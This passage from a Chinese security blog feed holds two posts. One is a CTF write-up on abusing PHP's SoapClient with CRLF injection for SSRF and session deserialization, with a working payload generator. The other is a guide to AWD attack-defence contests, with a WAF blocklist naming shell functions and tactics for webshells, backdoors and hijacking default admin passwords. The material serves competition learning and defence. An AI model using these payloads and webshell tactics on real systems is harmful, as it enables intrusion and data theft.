href="https://www.cnblogs.com/hujun1992/p/wsdl.html">https://www.cnblogs.com/hujun1992/p/wsdl.html</a>，一般来讲我们都不开这个模式的；而第二个参数<code>$options</code>需要传入一个数组，数组的格式就类似键值对，但这个键名是固定的，里面有很多选项可供我们选择，值是我们可以自定义的，不着急这个后面再讲；在<code>wsdl</code>模式的情况下，<code>$options</code>参数是可选的，也就是说可以没有；但在非<code>wsdl</code>模式下，就必须要设置<code>location</code>和<code>uri</code>选项，其中<code>location</code>是我们要将请求发送到的<code>SOAP</code>服务器的URL，也就是目标URL，而<code>uri</code>是<code>SOAP</code>服务的目标命名空间，这个我认为不太重要，叫啥都不影响哈哈</p><p>而在<code>SoapClient</code>类中，还有一个我们非常熟悉的魔术方法，<code>__call()</code>方法，当调用类中不存在的方法时就会触发，当触发这个方法后，它就会向<code>location</code>中的目标URL发送一个<code>soap</code>请求</p><p><img src="https://i.loli.net/2021/10/28/5FTcC9Bgix8uwlk.png" alt="image.png"></p><p>既然这个<code>SoapClient</code>类可以发起请求，而且URL我们也可以自己控制，那接下来我们就来向我们自己的服务器发起一个请求，然后监听该端口，看看会有什么反应</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$class</span> = <span class="string">&#x27;SoapClient&#x27;</span>;</span><br><span class="line"><span class="variable">$wsdl</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="variable">$options</span> = <span class="keyword">array</span>(<span class="string">&#x27;location&#x27;</span> =&gt; <span class="string">&#x27;http://yourip:6666&#x27;</span>,<span class="string">&#x27;uri&#x27;</span> =&gt; <span class="string">&quot;arsenetang&quot;</span>);</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="variable">$class</span>(<span class="variable">$wsdl</span>,<span class="variable">$options</span>);</span><br><span class="line"><span class="variable">$a</span> -&gt; a();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>当我们按下回车键之后，服务器这边立马就有了反应，接收到了我们的请求，我们可以看到这是一个POST请求，而且数据包啥的我们也都可以看到</p><p><img src="https://i.loli.net/2021/10/28/MiJOnsTQf7xuSk2.png" alt="image.png"></p><p>好了，既然可以发起请求了，我们就要想办法控制数据包中的内容了，毕竟发起这种请求没有任何意义，我们得想办法实现POST传参，将我们想要的参数传进去才行，这里就要提到我们前面说过的，参数<code>$options</code>里面的众多选项了，想看具体有哪些选项可以到手册里：<a href="https://www.php.net/manual/zh/soapclient.construct.php">https://www.php.net/manual/zh/soapclient.construct.php</a>，</p><p><img src="https://i.loli.net/2021/10/28/BTdcVb4we1UYgDx.png" alt="image.png"></p><p>发现这里面有一个很神奇的选项<code>user_agent</code>，用这个可以控制HTTP数据包中头部<code>User-Agent</code>的值，好耶，这意味着我们可以控制数据包，构造一个POST请求了，为啥呢？我们先来看看它发出的数据包是什么样子的：</p><p><img src="https://i.loli.net/2021/10/28/pwSrmi3cJI6NRHF.png" alt="image.png"></p><p>我们来看看这个数据包，其中<code>User-Agent</code>被我设置为了<code>WLLM</code>，在它下面还有三个参数，其中<code>SOAPAction</code>就是我们前面设置的<code>uri</code>，不用管，而其它两个都是它自动生成的，我们也可以通过控制它们的值，让它们的值是正确的，那我们的数据包也就是正确的了；这时候就需要讲出我们的CRLF了，CRLF是啥？CRLF是回车换行<code>(\r\n)(%0d%0a)</code>的简称，在HTTP响应中，响应头之间就是用一个CRLF分隔，就像<code>User-Agent</code>和<code>Content-Type</code>之间就是一个CRLF，而响应头和响应体之间是两个CRLF，而我们POST传参就属于请求体中的内容了</p><p><img src="https://i.loli.net/2021/10/28/Ya2spdZ5mKMqTuR.png" alt="image.png"></p><p>那通过CRLF，我们就可以完全控制数据包了，让它实现POST传参了，一般来说利用SoapClient进行SSRF攻击内网，然后配合CRLF构造出POST请求可以拓展我们的攻击面</p><h3 id="例题解析—bestphp’s-revenge"><a href="#例题解析—bestphp’s-revenge" class="headerlink" title="例题解析—bestphp’s revenge"></a>例题解析—bestphp’s revenge</h3><p>本来今年的极客大挑战有一道题恰好就用的这个方法，那道题才是构造POST传参，用那道题当例题更好，可惜现在比赛还没结束就放出WP不太好，所以说迫于无奈选了这道题，这道题好像是<code>lcft2018 final</code>的Web签到题，考点会多一些，首先看源码，index.php：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$b</span> = <span class="string">&#x27;implode&#x27;</span>;</span><br><span class="line">call_user_func(<span class="variable">$_GET</span>[<span class="string">&#x27;f&#x27;</span>], <span class="variable">$_POST</span>);</span><br><span class="line">session_start();</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;name&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$_SESSION</span>[<span class="string">&#x27;name&#x27;</span>] = <span class="variable">$_GET</span>[<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line">&#125;</span><br><span class="line">var_dump(<span class="variable">$_SESSION</span>);</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">array</span>(reset(<span class="variable">$_SESSION</span>), <span class="string">&#x27;welcome_to_the_lctf2018&#x27;</span>);</span><br><span class="line">call_user_func(<span class="variable">$b</span>, <span class="variable">$a</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>flag.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">only localhost can get flag!</span><br><span class="line">session_start();</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;only localhost can get flag!&#x27;</span>;</span><br><span class="line"><span class="variable">$flag</span> = <span class="string">&#x27;LCTF&#123;*************************&#125;&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_SERVER</span>[<span class="string">&quot;REMOTE_ADDR&quot;</span>]===<span class="string">&quot;127.0.0.1&quot;</span>)&#123;</span><br><span class="line">       <span class="variable">$_SESSION</span>[<span class="string">&#x27;flag&#x27;</span>] = <span class="variable">$flag</span>;</span><br><span class="line">   &#125;</span><br><span class="line">only localhost can get flag!</span><br></pre></td></tr></table></figure><p>这道题主要考的是<code>Session</code>反序列化，<code>SOAP+CRLF</code>发起<code>SSRF</code>，然后是<code>call_user_func</code>函数的运用</p><p>其实这题感觉思路挺简单的，必须是用<code>127.0.0.1</code>来请求<code>flag.php</code>才能得到flag，其它的都不行，而这里是不能绕的，只能老老实实按他的要求用<code>127.0.0.1</code>去访问，所以说这里明显是一个SSRF；然后这儿也找不到别的东西来发起请求，只能想到用<code>PHP</code>原生类<code>SoapClient</code>中的<code>__call()</code>方法发起请求；但这里也没有<code>unserialize()</code>函数呀，可是这儿开启了<code>session</code>，而且有一个<code>$_SESSION[&#39;name&#39;] = $_GET[&#39;name&#39;];</code>可以直接传入<code>session</code>，都免去了条件竞争，就很容易想到利用处理器的差异实现<code>Session</code>反序列化，但这里它也没有设置处理器为<code>php_serialize</code>呀，这儿就要提到<code>session_start</code>函数了，感觉很神奇哈哈，在PHP7中，<code>session_start()</code>函数可以接收一个数组作为参数，而且可以覆盖掉<code>php.ini</code>中的<code>session</code>配置项，也就是说像我们传入一个<code>session_start(array(&#39;serialize_handler&#39;=&gt;&#39;php_serialize&#39;))</code>，根据php7的特性就可以将<code>session.serialize</code>改成<code>php_serialize</code>了；那我们在哪里传入<code>session_start</code>呢？不是有<code>call_user_func</code>嘛，而且它的第二个参数还固定是<code>$_POST</code>数组，就正好；而<code>call_user_func</code>会将第一个参数当成函数，后面的参数当成函数中的参数，所以说我们只用将<code>?f=session_start</code>就行了，然后POST传入<code>serialize_handler=php_serialize</code>，<code>GET</code>的<code>name</code>变量传入我们序列化后的字符串，就可以了，现在开始构造exp，挺简单的我就直接写了：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$target</span> = <span class="string">&quot;http://127.0.0.1/flag.php&quot;</span>;</span><br><span class="line"><span class="variable">$attack</span> = <span class="keyword">new</span> SoapClient(<span class="literal">null</span>,<span class="keyword">array</span>(<span class="string">&#x27;location&#x27;</span> =&gt; <span class="variable">$target</span>,<span class="string">&#x27;user_agent&#x27;</span> =&gt; <span class="string">&quot;WLLM\r\nCookie: PHPSESSID=yyds\r\n&quot;</span>,<span class="string">&#x27;uri&#x27;</span> =&gt; <span class="string">&quot;arsenetang&quot;</span>));</span><br><span class="line"><span class="variable">$payload</span> = urlencode(serialize(<span class="variable">$attack</span>));</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;|&#x27;</span>.<span class="variable">$payload</span>;</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/10/29/NA8dZgXlQsrGLqP.png" alt="image.png"></p><p>可能有的朋友会有疑惑，这里为什么要带上<code>COOKIE</code>呢，因为这里发起请求相当于就是这个<code>COOKIE</code>请求了<code>http://127.0.0.1/flag.php</code>这个页面，但请求了过后也没有回显，所以我们需要将浏览器中的<code>COOKIE</code>换成我们设置好的<code>COOKIE</code>就行了</p><p>这一步过后虽然我们想要的序列化的内容以及写入<code>session</code>中，但反序列化后并不能发起<code>soap</code>请求，因为前面我们说到了，他要调用类中不存在的方法时才能触发<code>__call()</code>发起请求，所以说我们需要调用一个<code>SoapClient</code>类中不存在的方法，这时候我们再一次瞄准了<code>call_user_func</code>，我们可以首先将<code>f</code>传成<code>extract</code>，这样就可以变量覆盖，将<code>$_POST</code>数组覆盖掉，然后我们再<code>POST</code>一个<code>b=call_user_func</code>，就可以将<code>$b</code>的值由<code>implode</code>变成<code>call_user_func</code>，那么相当于就是：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">call_user_func(<span class="string">&#x27;call_user_func&#x27;</span>,<span class="keyword">array</span>(<span class="string">&#x27;reset($_SESSION)&#x27;</span>,<span class="string">&#x27;welcome_to_the_lctf2018&#x27;</span>));</span><br></pre></td></tr></table></figure><p>而<code>reset($_SESSION)</code>是我们的<code>SoapClient</code>类对象，那么相当于就是调用了<code>SoapClient</code>类中不存在的<code>welcome_to_the_lctf2018</code>方法，这样就可以触发<code>__call()</code>方法发起<code>soap</code>请求了</p><p><img src="https://i.loli.net/2021/10/29/JuTE7d8o4MSWbfc.png" alt="image.png"></p><p>然后我们将<code>COOKIE</code>一替换就好了</p><p><img src="https://i.loli.net/2021/10/29/kct39nCjUJg5xiI.png" alt="image.png"></p><p>害不愧是<code>lctf final</code>的题，哪怕是签到题依然涉及了这么多考点，等到今年极客大挑战结束之后，我把那道题的WP放出来，就更能理解利用<code>SoapClient</code>类配合<code>CRLF</code>进行<code>SSRF</code>攻击啦，那道题就需要我们<code>POST</code>传参然后他将flag给我们弹回来</p><p>19岁的最后一篇文章写完啦，20岁继续努力吧哈哈哈</p><p>参考文章：</p><p><a href="https://blog.csdn.net/qq_42181428/article/details/100569464">https://blog.csdn.net/qq_42181428/article/details/100569464</a></p><p><a href="https://blog.csdn.net/mochu7777777/article/details/115276176">https://blog.csdn.net/mochu7777777/article/details/115276176</a></p><p><a href="https://www.ajsafe.com/news/184.html">https://www.ajsafe.com/news/184.html</a></p><p><a href="https://www.anquanke.com/post/id/153065#h2-1">https://www.anquanke.com/post/id/153065#h2-1</a></p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;PHP原生类的运用&quot;&gt;&lt;a href=&quot;#PHP原生类的运用&quot; class=&quot;headerlink&quot; title=&quot;PHP原生类的运用&quot;&gt;&lt;/a&gt;PHP原生类的运用&lt;/h1&gt;&lt;p&gt;最近比赛打的挺多的，也从中学到了很多有意思的新东西，比如说&lt;code&gt;PHP&lt;/code&gt;的原生类利用；之前我就很少用过它，但最近通过连续比赛中的几道CTF题目让我发现了它非常神奇的用法，这肯定得来总结总结对吧哈哈哈&lt;/p&gt;</summary>
    
    
    
    
    <category term="ctf" scheme="https://arsenetang.github.io/tags/ctf/"/>
    
    <category term="Web安全" scheme="https://arsenetang.github.io/tags/Web%E5%AE%89%E5%85%A8/"/>
    
    <category term="php" scheme="https://arsenetang.github.io/tags/php/"/>
    
    <category term="反序列化" scheme="https://arsenetang.github.io/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    
  </entry>
  
  <entry>
    <title>一文了解CTF线下赛---AWD</title>
    <link href="https://arsenetang.github.io/2021/10/18/%E4%B8%80%E6%96%87%E4%BA%86%E8%A7%A3CTF%E7%BA%BF%E4%B8%8B%E8%B5%9B%20---%20AWD/"/>
    <id>https://arsenetang.github.io/2021/10/18/%E4%B8%80%E6%96%87%E4%BA%86%E8%A7%A3CTF%E7%BA%BF%E4%B8%8B%E8%B5%9B%20---%20AWD/</id>
    <published>2021-10-17T16:00:00.000Z</published>
    <updated>2021-10-18T04:07:36.440Z</updated>
    
    <content type="html"><![CDATA[<h1 id="一文了解CTF线下赛-—-AWD"><a href="#一文了解CTF线下赛-—-AWD" class="headerlink" title="一文了解CTF线下赛 — AWD"></a>一文了解CTF线下赛 — AWD</h1><p>前几天和<code>Light1ng</code>的师傅们一起参加了在天津举办的第五空间决赛，虽然结果不尽如人意，全程被pwn爷爷带飞，而web的环境还时不时宕机，分不清是被打了还是主办方的环境坏了，所以web手基本上全程坐牢，太痛苦了，最后狗了一个三等奖，但这次比赛还是收获了很多，面基到了各位师傅很开心，接下来就来简单总结一下awd吧，因为我也只是个web手，所以说以下的总结也都只针对web哈</p><span id="more"></span><h2 id="1-什么是AWD"><a href="#1-什么是AWD" class="headerlink" title="1.什么是AWD"></a>1.什么是AWD</h2><p>AWD赛制是一种网络安全竞赛的赛制。AWD赛制由安全竞赛专家及行业专家凭借十多年实战经验，将真实网络安全防护设备设施加入抽象的网络环境中，模拟政府、企业、院校等单位的典型网络结构和配置，开展的一种人人对抗的竞赛方式，考验参赛者攻防兼备的能力。其主要特点为：强调实战性、实时性、对抗性，综合考量竞赛队的渗透能力和防护能力。(摘自百度百科)</p><p>百度百科的说法有点太过于专业了，其实简单点说AWD就是攻防大战，我们可以进入到别人的网站，一般都是某个cms，大部分都是php的站，少部分可能会有Java或者python的，然后找到网站中的漏洞，利用它getshell，拿到对方服务器上的flag；我们也可以维护自己的网站，通过<code>xshell</code>和<code>xftp</code>，SSH连接上自己的服务器后，将源码下载下来，然后利用扫描工具扫描它的漏洞，对应删掉自带后门，上waf脚本，文件固化脚本等方式防止对手将木马写入我们服务器中；但我们不能删除源码，因为每一轮都会对所有队伍网站进行check，check不过的队伍会被扣分，然后分数会由check通过的队伍平分，所以我们首先要保证网站的正常服务功能不受影响，不能宕机</p><h2 id="2-流程"><a href="#2-流程" class="headerlink" title="2.流程"></a>2.流程</h2><ol><li><p>出题方会给每一支队伍部署同样环境的主机，主机有一台或者多台。</p></li><li><p>拿到机器后每个队伍会有一定的加固时间或没有加固时间，这个视规则而定。</p></li><li><p>每个服务、数据库、主机上都会可能存在 flag 字段，并且会定时刷新。通过攻击拿到 flag 后需要提交到裁判机进行得分，一般会提供指定的提交接口。下一轮刷新后，如果还存在该漏洞，可以继续利用漏洞获取 flag 进行得分。</p></li></ol><h2 id="3-防守"><a href="#3-防守" class="headerlink" title="3.防守"></a>3.防守</h2><p>我觉得防守在awd中永远是最重要的，也是一开始就必须要做的事情，因为到后面如果被上了不死马或者被打宕机了，说实话就很难进行防守了，到时候就只有看着每一轮都疯狂扣分，那是真的心碎哈哈哈；所以比赛开始后一定要先防守，有的比赛会有加固时间而有的比赛是直接开始打，这种时候就很拼手速了；首先登录上ssh，看看ssh的密码，如果是弱密码或者和队伍名相同或相关的密码一定要抓紧改掉，如果被别人拿到了ssh密码基本上这比赛就没了；登陆上之后利用<code>xftp</code>将<code>html</code>目录直接下载下来，放入D盾或者其它扫描工具中扫描，一般它都会有自带的后门，先把后门的路径记录下来，因为所有队伍的环境都是一样的，你有后门的地方一定别的队伍也有，然后将自带后门删掉或者改掉；接下来就先登录我们自己的网站后台，将默认的后台密码改掉，默认的后台密码可以去百度中查询对应的cms，一般来说是<code>admin admin</code>或者<code>admin 123456</code>，这一步也非常重要，如果网站后台密码被对手改掉也就很难操作了，所以说在团队赛中一般是一个人删后门一个人改后台密码；改完之后就可以在合适的地方上waf了，我们可以参考D盾的扫描结果，在一些存在危险函数的地方上waf，或者说在网站的入口上waf，一般在入口上waf效率是很高的，因为可以监控全部的流量，接下来演示一下怎么上，方法非常简单，这个waf出自大黑阔LTLT之手</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$Filter</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line"><span class="comment">#如果要开启流量监控且过滤拦截请将Filter设置为ON 默认不开启过滤拦截 注意误拦</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$SAVEPATH</span> = <span class="string">&quot;/tmp/sec&quot;</span>;</span><br><span class="line"><span class="comment">#流量文件保存地址 默认在 /tmp/sec 中,可以自行修改</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#使用方法:将本文件在需要防护的php文件中include即可</span></span><br><span class="line"><span class="comment">#下面是敏感字符  参数和值  都将会被检测  可自定义敏感字符</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$black_list</span> = <span class="keyword">array</span>(<span class="string">&quot;pcntl&quot;</span>, <span class="string">&quot;assert&quot;</span>, <span class="string">&quot;phpinfo&quot;</span>, <span class="string">&quot;exec&quot;</span>, <span class="string">&quot;popen&quot;</span>, <span class="string">&quot;fopen&quot;</span>, <span class="string">&quot;fclose&quot;</span>, <span class="string">&quot;fwrite&quot;</span>, <span class="string">&quot;passthru&quot;</span>, </span><br><span class="line"><span class="string">&quot;symlink&quot;</span>, <span class="string">&quot;link&quot;</span>, <span class="string">&quot;syslog&quot;</span>,<span class="string">&quot;imap_open&quot;</span>, <span class="string">&quot;shell&quot;</span>, <span class="string">&quot;mail&quot;</span>, <span class="string">&quot;system&quot;</span>, <span class="string">&quot;hex&quot;</span>, <span class="string">&quot;chdir&quot;</span>, <span class="string">&quot;`&quot;</span>, <span class="string">&quot;var_dump&quot;</span>,</span><br><span class="line"><span class="string">&quot;chr&quot;</span>, <span class="string">&quot;mkdir&quot;</span>, <span class="string">&quot;cat&quot;</span> , <span class="string">&quot;tac&quot;</span>, <span class="string">&quot;ls&quot;</span> ,<span class="string">&quot;echo&quot;</span>, <span class="string">&quot;print&quot;</span>, <span class="string">&quot;nl&quot;</span>, <span class="string">&quot;IFS&quot;</span> ,<span class="string">&quot;&lt;&quot;</span> ,<span class="string">&quot;&gt;&quot;</span>, <span class="string">&quot;|&quot;</span>, <span class="string">&quot;&#x27;&quot;</span>, <span class="string">&quot;\&quot;&quot;</span>, <span class="string">&quot;select&quot;</span>,</span><br><span class="line"><span class="string">&quot;union&quot;</span>, <span class="string">&quot;information_schema&quot;</span>, <span class="string">&quot;updatexml&quot;</span> ,<span class="string">&quot;exp&quot;</span> ,<span class="string">&quot;pwd&quot;</span>, <span class="string">&quot;rev&quot;</span>, <span class="string">&quot;sed&quot;</span>, <span class="string">&quot;file&quot;</span>, <span class="string">&quot;copy&quot;</span>, <span class="string">&quot;terminated&quot;</span>, </span><br><span class="line"><span class="string">&quot;extractvalue&quot;</span>, <span class="string">&quot;concat&quot;</span>, <span class="string">&quot;order&quot;</span>, <span class="string">&quot;const&quot;</span>, <span class="string">&quot;&#123;&quot;</span>, <span class="string">&quot;&#125;&quot;</span> , <span class="string">&quot;REQUEST&quot;</span>, <span class="string">&quot;bash&quot;</span>, <span class="string">&quot;include&quot;</span>,</span><br><span class="line"><span class="string">&quot;require&quot;</span>, <span class="string">&quot;env&quot;</span>, <span class="string">&quot;strrev&quot;</span>, <span class="string">&quot;~&quot;</span>, <span class="string">&quot;^&quot;</span>, <span class="string">&quot;../&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter_</span>(<span class="params"><span class="variable">$keyF</span></span>)</span>&#123;</span><br><span class="line"><span class="comment">#拦截后执行的函数,可以自定义</span></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$keyF</span> === <span class="string">&quot;ON&quot;</span>)&#123;</span><br><span class="line"><span class="variable">$time</span> = md5(time());</span><br><span class="line"><span class="keyword">die</span>(<span class="string">&quot;flag&#123;<span class="subst">&#123;$time&#125;</span>&#125;&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$tra_all</span> = var_export(<span class="variable">$_REQUEST</span>, <span class="literal">TRUE</span>);</span><br><span class="line">file_put_contents(<span class="string">&quot;<span class="subst">&#123;$SAVEPATH&#125;</span>&quot;</span>, <span class="string">&quot;[+]PATH: <span class="subst">&#123;$_SERVER[&#x27;PHP_SELF&#x27;]&#125;</span> | HAED: <span class="subst">&#123;$_SERVER[&#x27;REQUEST_METHOD&#x27;]&#125;</span> | Traffic: <span class="subst">&#123;$tra_all&#125;</span>\n&quot;</span>, FILE_APPEND);</span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span> (<span class="variable">$_REQUEST</span> <span class="keyword">as</span> <span class="variable">$Re_key</span> =&gt; <span class="variable">$Re_value</span>) &#123;</span><br><span class="line"><span class="keyword">foreach</span> (<span class="variable">$black_list</span> <span class="keyword">as</span> <span class="variable">$b_key</span> =&gt; <span class="variable">$b_value</span>) &#123;</span><br><span class="line"><span class="comment"># 先将字符串去除点</span></span><br><span class="line"><span class="variable">$out_spot_key</span> = str_ireplace(<span class="string">&quot;.&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="variable">$Re_key</span>);</span><br><span class="line"><span class="variable">$out_spot_value</span> = str_ireplace(<span class="string">&quot;.&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="variable">$Re_value</span>);</span><br><span class="line"><span class="comment"># 字符串尝试替换black_list</span></span><br><span class="line"><span class="variable">$bla_k</span> = str_ireplace(<span class="variable">$black_list</span>, <span class="string">&quot;_&quot;</span>, <span class="variable">$out_spot_key</span>);</span><br><span class="line"><span class="variable">$bla_v</span> = str_ireplace(<span class="variable">$black_list</span>, <span class="string">&quot;_&quot;</span>, <span class="variable">$out_spot_value</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$out_spot_key</span>!=<span class="variable">$bla_k</span> || <span class="variable">$out_spot_value</span>!=<span class="variable">$bla_v</span>) &#123;</span><br><span class="line"><span class="comment"># 检测到有奇怪输入,跳转到WAF防御界面</span></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$writeabble</span> == <span class="number">0</span>)&#123;</span><br><span class="line">file_put_contents(<span class="string">&quot;<span class="subst">&#123;$SAVEPATH&#125;</span>&quot;</span>, <span class="string">&quot;[WARNING]PATH: <span class="subst">&#123;$_SERVER[&#x27;PHP_SELF&#x27;]&#125;</span> | HAED: <span class="subst">&#123;$_SERVER[&#x27;REQUEST_METHOD&#x27;]&#125;</span> | Traffic: <span class="subst">&#123;$tra_all&#125;</span>\n&quot;</span>, FILE_APPEND);</span><br><span class="line"><span class="variable">$writeabble</span> = <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line">filter_(<span class="variable">$Filter</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>这个waf我已经在实战中用过了，确实是很好用，过滤的字符可以进行自定义，我们直接在需要的地方利用<code>include(&#39;waf.php&#39;)</code>包含waf就行，当它检测到危险字符时就会进行拦截，当然我们为了防止误拦也可以不开启<code>$Filter</code>，如果不开启的化，它就只会监控流量但不会做出拦截，下图我是开了拦截的，它就会反弹假flag</p><p><img src="https://i.loli.net/2021/10/17/iaBDhXO85Mgbm2d.png" alt="image.png"></p><p>然后我们还可以去看攻击者的流量，这一步是非常最要的，因为假如攻击者攻击成功的话，我们就可以通过分析攻击者攻击成功的这个流量去攻击其它的队伍，拿一波flag，这里流量的路径是<code>/tmp/sec</code>，我们来看看效果：</p><p><img src="https://i.loli.net/2021/10/17/gORoQpGbtLwcqrV.png" alt="image.png"></p><p>这里攻击者攻击我们的payload我们全都可以看到，假如攻击者攻击成功的话我们直接用这个payload去打别的队伍就行了，基本上一打一个准；但由于这里我们过滤的字符还是比较多的，如果过不掉每一轮的check的话，我们就可以关掉拦截，只监控，同样可以拿到别人的payload去打其他队</p><p>假如我们不小心被对手种入了不死马应该怎么办呢？通常有下面几种克制方法：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">强行 kill 掉进程后重启服务</span><br><span class="line">建立一个和不死马相同名字的文件或者目录</span><br><span class="line">写脚本不断删除文件</span><br><span class="line">不断写入一个和不死马同名的文件</span><br></pre></td></tr></table></figure><p>总结一下，awd中的防守主要操作就是下载源码，改后台密码，删掉自带后门，上waf，进行流量监控，杀掉不死马，还有一个文件固化的操作因为我实战中没有用过这里就不讲了，想了解的朋友可以去看看小迪的视频，讲的还是非常不错的，而且对应的脚本啥的也有，视频地址：<a href="https://www.bilibili.com/video/BV1JZ4y1c7ro?p=79">https://www.bilibili.com/video/BV1JZ4y1c7ro?p=79</a></p><h2 id="4-进攻"><a href="#4-进攻" class="headerlink" title="4.进攻"></a>4.进攻</h2><p>相对于防守相对比较固定的套路，进攻的方法那可就灵活太多了，很难找到固定的套路；首先在拿到我们自己的ip地址后，可以利用python脚本先生成批量ping的地址，因为第一步肯定是先获取对方网站的地址，有的比赛举办方会直接告诉大家所有队伍的地址，但有的比赛比如说bugku中的awd比赛就不会告诉你，这时候就需要我们先探测出来，这个脚本我是依照bugku中的比赛写的，很简单的几句代码：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line">    ip = <span class="string">&quot;192-168-1-&quot;</span>+<span class="built_in">str</span>(i)+<span class="string">&quot;.pvp670.bugku.cn&quot;</span></span><br><span class="line">    <span class="built_in">print</span>(ip)</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/10/18/sYa1BdWLOn9Ziy6.png" alt="image.png"></p><p>就先这样生成字典，然后复制进去，放入批量ping的工具中，批量ping的工具一般用<code>PingInfoView</code>，看哪个网址可以ping通就说明它存在</p><p><img src="https://i.loli.net/2021/10/18/qwamz4n5cEAOY12.png" alt="image.png"></p><p>找到对方的网站之后，我们可以先利用前面获得的自带后门的路径去试试，看它有没有删掉，如果没有删掉，那就可以利用这个自带后门getshell上不死马了，这个后面再慢慢说；与此同时，我们要快速登录对方的网站后台地址，后台的路径可以去百度搜对应的cms，首先试试看默认密码能不能登录上去，如果能的话马上登上去修改它的密码，说实话这就是个拼手速的游戏，争取能抢在所有队前面把默认密码都改了，这样相当于拿下了所有队伍的后台，后续利用后台getshell就非常方便了</p><p>当我们把所有队的自带后门都测试完，后台密码就改了之后，就可以给还没删掉自带后门的队伍上不死马了，因为很多自带后门都是<code>GET</code>型木马，所以说我们不能直接利用它连接蚁剑，我们可以在里面嵌套一个<code>POST</code>木马，演示如下：</p><p><img src="https://i.loli.net/2021/10/18/zxBa6TAtQcFC1Ow.png" 